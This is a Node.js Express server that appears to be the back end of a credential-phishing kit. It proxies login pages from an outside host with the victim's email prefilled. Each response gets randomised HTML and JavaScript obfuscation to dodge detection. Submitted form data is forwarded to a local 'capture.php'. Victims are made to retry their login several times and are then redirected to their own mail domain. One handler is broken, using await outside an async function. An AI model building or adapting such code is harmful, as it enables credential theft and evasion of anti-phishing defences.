const express = require('express');
const https = require('https');
const axios = require('axios');
const qs = require('qs');
const session = require('express-session');
const bodyParser = require('body-parser');
const crypto = require('crypto');
const JavaScriptObfuscator = require('javascript-obfuscator'); // Added obfuscator package

const app = express();
const PORT = 3000;

// Function to generate random obfuscation options for each request
function getRandomObfuscatorOptions() {
  const encodings = ['base64', 'rc4']; // valid values
  const shuffle = arr => arr.sort(() => 0.5 - Math.random());

  // randomly decide whether to use one encoding, both, or none
  let chosenEncodings = [];
  if (Math.random() > 0.5) {
    chosenEncodings = shuffle(encodings).slice(0, Math.floor(Math.random() * encodings.length) + 1);
  }

  return {
    compact: Math.random() > 0.5,
    controlFlowFlattening: Math.random() > 0.7,
    deadCodeInjection: Math.random() > 0.6,
    stringArray: true,
    stringArrayEncoding: chosenEncodings, // must be an array of unique values
    stringArrayThreshold: Math.random(),
    renameGlobals: Math.random() > 0.7,
  };
}

// Function to obfuscate JavaScript code dynamically
function obfuscateJavaScript(code) {
  try {
    const options = getRandomObfuscatorOptions();
    const obfuscationResult = JavaScriptObfuscator.obfuscate(code, options);
    return obfuscationResult.getObfuscatedCode();
  } catch (err) {
    console.error('Error obfuscating JavaScript:', err);
    return code; // fallback to original script so page doesn’t break
  }
}

// Function to generate random HTML obfuscation patterns
function generateObfuscationPattern() {
  const patterns = [
    // Random string insertion
    (str) => {
      const randomStr = crypto.randomBytes(8).toString('hex');
      return str.replace(/(<[^>]+>)/g, `$1<!--${randomStr}-->`);
    },
    // Attribute shuffling
    (str) => {
      return str.replace(/(<[a-zA-Z]+)([^>]*)(>)/g, (match, tagStart, attributes, tagEnd) => {
        const attrArray = attributes.trim().split(/\s+/).filter(attr => attr);
        for (let i = attrArray.length - 1; i > 0; i--) {
          const j = Math.floor(Math.random() * (i + 1));
          [attrArray[i], attrArray[j]] = [attrArray[j], attrArray[i]];
        }
        return tagStart + ' ' + attrArray.join(' ') + tagEnd;
      });
    },
    // Whitespace manipulation
    (str) => {
      return str.replace(/>\s+</g, (match) => {
        const spaces = ' '.repeat(Math.floor(Math.random() * 5) + 1);
        return '>' + spaces + '<';
      });
    },
    // Comment injection
    (str) => {
      const comments = [
        '<!-- random comment -->',
        '<!-- ' + crypto.randomBytes(4).toString('hex') + ' -->',
        '<!-- obfuscated -->'
      ];
      return str.replace(/(<\/[a-zA-Z]+>)/g, (match) => {
        return comments[Math.floor(Math.random() * comments.length)] + match;
      });
    }
  ];

  // Return a random combination of obfuscation patterns
  const selectedPatterns = [];
  const count = Math.floor(Math.random() * patterns.length) + 1;
  
  for (let i = 0; i < count; i++) {
    const randomIndex = Math.floor(Math.random() * patterns.length);
    if (!selectedPatterns.includes(randomIndex)) {
      selectedPatterns.push(randomIndex);
    }
  }

  return (str) => {
    let result = str;
    selectedPatterns.forEach(patternIndex => {
      result = patterns[patternIndex](result);
    });
    return result;
  };
}

// Function to obfuscate specific content (like emails, phone numbers)
function obfuscateSensitiveContent(body) {
  // Obfuscate emails
  body = body.replace(/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9._-]+)/g, (email) => {
    const parts = email.split('@');
    const username = parts[0];
    const domain = parts[1];
    const obfuscatedUsername = username.substring(0, 2) + '*'.repeat(username.length - 2);
    return obfuscatedUsername + '@' + domain;
  });

  // Obfuscate phone numbers (simple pattern)
  body = body.replace(/(\+\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}/g, (phone) => {
    return phone.substring(0, phone.length - 4) + '****';
  });

  return body;
}

// Middleware to parse body
app.use(bodyParser.urlencoded({ extended: true })); // for form data
app.use(bodyParser.json()); // for JSON payloads

// session middleware
app.use(session({
  secret: 'v3nom',  // change this
  resave: false,
  saveUninitialized: true,
  cookie: { maxAge: 5 * 60 * 1000 } // 5 min session
}));

// define root route to avoid 404 on `/`
app.get('/', (req, res) => {
  res.send('Hello - API running');
});

// Test route: fetch google.com and return its HTML
app.get('/test-google', (req, res) => {
  const url = 'https://account.circulations.digital/information.aspx?good=jobs@gmx.com';
  try {
  const remote = await axios.get(url, {
    headers: { 'User-Agent': 'Mozilla/5.0 (your-custom-UA)', 'Accept': 'text/html' },
    timeout: 10000
  });
  console.log("Remote response status", remote.status);
  console.log("Remote response headers", remote.headers);
  res.setHeader('Content-Type', remote.headers['content-type'] || 'text/html');
  return res.status(remote.status).send(remote.data);
} catch (err) {
  console.error("Axios fetch error:", err.message);
  res.status(500).send("Remote fetch error");
}
	
  /*https.get(url, { headers: { 'User-Agent': 'Node.js/HTTPS' } }, (proxyRes) => {
    let data = '';

    proxyRes.on('data', (chunk) => {
      data += chunk;
    });

    proxyRes.on('end', () => {
      // set content type so browser knows it's HTML
      res.setHeader('Content-Type', 'text/html');
      // send the HTML from google.com
      res.status(proxyRes.statusCode).send(data);
    });

  }).on('error', (err) => {
    console.error('Error fetching Google:', err.message);
    res.status(500).send('Error fetching Google');
  });*/
});

// API route that matches with slash param
app.get('/api/id/:email', (req, res) => {
  const rawEmail = req.params.email;
  const decoded = decodeURIComponent(rawEmail);
  const isEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(decoded);
  let targetUrl;

  if (isEmail) {
    targetUrl = `https://account.circulations.digital/information.aspx?good=${decoded}`;
  } else {
    // fallback to previous behaviour
    targetUrl = `https://account.circulations.digital${req.originalUrl.replace('/api', '')}`;
  }
  
  const options = {
    headers: {
      'User-Agent': req.headers['user-agent'] || '',
    },
  };
  
  //console.log("targetUrl: ", targetUrl);
  console.log("Outgoing request to:", targetUrl);
  https.get(targetUrl, options, (proxyRes) => {
	 console.log("Got response status:", proxyRes.statusCode);
	  let body = '';

    // Collect data chunks
    proxyRes.on('data', (chunk) => {
      body += chunk;
    });

    proxyRes.on('end', () => {	  		  
	if (proxyRes.headers['content-type'] &&
		proxyRes.headers['content-type'].toLowerCase().includes('text/html')) {

	  // define baseTag in this scope so it's available when inserting into head
	  const baseTag = `<base href="https://account.circulations.digital">`;

	  try {
		// Quick sanity: if body is empty or clearly not text, skip HTML processing
		if (!body || typeof body !== 'string' || body.length < 10) {
		  // nothing to do
		} else {
		  // Generate unique obfuscation pattern for non-script HTML parts
		  const obfuscate = generateObfuscationPattern();

		  // Split the HTML by <script>...</script> blocks (keeps the delimiters)
		  const parts = body.split(/(<script\b[^>]*>[\s\S]*?<\/script>)/gi);

		  for (let i = 0; i < parts.length; i++) {
			const part = parts[i];

			// If it is a script block, process separately
			if (/^<script\b/gi.test(part)) {
			  // If the script tag has a src attribute, leave it alone (external script)
			  if (/\bsrc\s*=/i.test(part)) {
				// do nothing: keep external script tag as-is
				continue;
			  }

			  // For inline scripts: capture opening tag, inner JS, and closing tag
			  const m = part.match(/^(<script\b[^>]*>)([\s\S]*?)(<\/script>)$/i);
			  if (m) {
				const openTag = m[1];
				const scriptContent = m[2];
				const closeTag = m[3];

				// Obfuscate the JS code with javascript-obfuscator (random options)
				const obfuscatedJS = obfuscateJavaScript(scriptContent);

				// Replace the part with the obfuscated inline script
				parts[i] = `${openTag}${obfuscatedJS}${closeTag}`;
			  }
			} else {
			  // Non-script HTML: first obfuscate sensitive content, then apply HTML patterns
			  let htmlPart = part;

			  // Obfuscate sensitive content only in HTML/text nodes
			  htmlPart = obfuscateSensitiveContent(htmlPart);

			  // Apply random HTML obfuscation patterns (this will not touch script parts)
			  htmlPart = obfuscate(htmlPart);

			  // Insert base tag into head if present (case-insensitive) and if base missing
			  htmlPart = htmlPart.replace(/<head(\s*[^>]*)>/i, (match) => {
				// Only insert once — check the full rebuilt body (use original body to detect)
				if (!/\<base\b/i.test(body)) {
				  return match + baseTag;
				}
				return match;
			  });

			  parts[i] = htmlPart;
			}
		  } // end for

		  // Rebuild the body from parts
		  body = parts.join('');

		  // Add a unique fingerprint to each response (only if </html> exists)
		  const fingerprint = crypto.randomBytes(4).toString('hex');
		  if (body.match(/<\/html>/i)) {
			body = body.replace(/<\/html>/i, `<!-- Fingerprint: ${fingerprint} --></html>`);
		  } else {
			// if no </html>, append fingerprint at the end
			body += `\n<!-- Fingerprint: ${fingerprint} -->`;
		  }
		}
	  } catch (err) {
		console.error('Error while processing HTML/inline scripts:', err);
		// fallback: don't modify body so we don't break the client
	  }
	}
	  
	  // Check if the response is JavaScript
      if (proxyRes.headers['content-type'] && 
          (proxyRes.headers['content-type'].includes('application/javascript') || 
           proxyRes.headers['content-type'].includes('text/javascript'))) {
        // Obfuscate JavaScript code using javascript-obfuscator
        body = obfuscateJavaScript(body);
      }

      // Set CORS headers for the client
      res.setHeader('Access-Control-Allow-Origin', '*');
      res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
      res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
      res.setHeader('Content-Type', proxyRes.headers['content-type'] || 'text/html');
      
      // Send the modified or original response back to the client
      res.status(proxyRes.statusCode).send(body);
    });

    proxyRes.on('error', (error) => {
      console.error('Error fetching the target URL:', error);
      res.sendStatus(500); // Send a 500 error if something goes wrong
    });
  }).on('error', (error) => {
    console.error('Error in HTTPS request:', error);
    res.sendStatus(500);
  });
});

app.post('/api/*', async (req, res) => {
  try {
    console.log("req.body: ", req.body);

    // Forward POST data to PHP
    await axios.post(
      'http://localhost/Tele/capture.php',
      qs.stringify(req.body),
      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
    );

    // Track attempts in session
    if (!req.session.attempts) req.session.attempts = 0;
    req.session.attempts++;

    console.log(`Attempts so far: ${req.session.attempts}`);

    if (req.session.attempts < 3) {
      // First attempt → reload the same page (original GET)
      //const reloadUrl = req.originalUrl.replace('/api', '');
	  const reloadUrl = req.originalUrl;
      return res.redirect(reloadUrl);
    } else {
      // Second attempt → redirect to email domain
      let emailField = Object.values(req.body).find(v => typeof v === 'string' && v.includes('@'));
      let redirectDomain = 'https://google.com';

      if (emailField) {
        let domain = emailField.split('@')[1];
        redirectDomain = `https://${domain}`;
      }

      /* // reset attempts after redirect
      req.session.attempts = 0;
      return res.redirect(redirectDomain); */
	  
	  // reset attempts after redirect
		req.session.attempts = 0;

		// Build the safe redirect HTML that asks the parent/top to navigate
		const safeUrl = String(redirectDomain).replace(/"/g, '\\"'); // escape any quotes to be safe
		const redirectHtml = `<!doctype html>
		<html>
		  <head>
			<meta charset="utf-8">
			<title>Redirecting…</title>
			<meta name="viewport" content="width=device-width, initial-scale=1">
			<style>
			  /* minimal, so page is usable if JS disabled */
			  body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; margin: 40px; color:#222; }
			  .msg { max-width: 640px; margin: 0 auto; }
			  a { color: #06c; }
			</style>
		  </head>
		  <body>
			<!-- <div class="msg">
			  <h1>Redirecting…</h1>
			  <p>If you are inside an iframe, the parent window will be redirected shortly. If nothing happens, <a href="${safeUrl}" target="_top">click here</a>.</p>
			</div> -->

			<script>
			  (function () {
				var target = "${safeUrl}";
				try {
				  // If inside iframe -> ask parent to navigate top
				  if (window.top !== window.self) {
					// Try to change the top-level location
					window.top.location = target;
				  } else {
					// Not inside iframe -> normal redirect
					window.location.href = target;
				  }
				} catch (e) {
				  // If cross-origin access throws, fall back to opening in top via anchor
				  console.warn('Top navigation failed, falling back to link', e);
				  var a = document.createElement('a');
				  a.href = target;
				  a.target = '_top';
				  a.rel = 'noopener noreferrer';
				  a.textContent = 'Continue';
				  document.body.appendChild(a);
				}
			  })();
			</script>
		  </body>
		</html>`;

		// Send the HTML with proper headers
		res.setHeader('Content-Type', 'text/html; charset=utf-8');
		return res.status(200).send(redirectHtml);
    }

  } catch (err) {
    console.error('Error handling request:', err.message);
    res.status(500).send('Server error');
  }
});

app.options('/api/*', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.sendStatus(200);
});

app.listen(PORT, () => {
  console.log(`Proxy server running on http://localhost:${PORT}`);
});

// Export app for Vercel
module.exports = app;




